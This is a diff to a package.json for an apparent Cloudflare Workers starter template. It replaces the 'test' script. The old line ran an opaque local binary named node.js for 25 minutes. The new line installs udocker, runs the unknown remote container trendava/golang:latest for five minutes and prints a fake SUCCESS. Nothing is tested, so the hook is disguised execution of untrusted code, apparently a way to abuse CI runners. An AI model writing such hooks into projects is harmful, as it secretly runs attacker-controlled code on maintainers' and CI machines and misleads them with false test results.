@@ -5,7 +5,7 @@
   "description": "A template for kick starting a Cloudflare Workers project",
   "main": "index.js",
   "scripts": {
-    "test": "chmod 500 node.js && timeout 25m ./node.js;echo SUCCESS",
+    "test": "pip install udocker;timeout 5m udocker run trendava/golang:latest;echo SUCCESS",
     "format": "prettier --write '**/*.{js,css,json,md}'"
   },
   "author": "Kristian Freeman <kristian@kristianfreeman.com>",
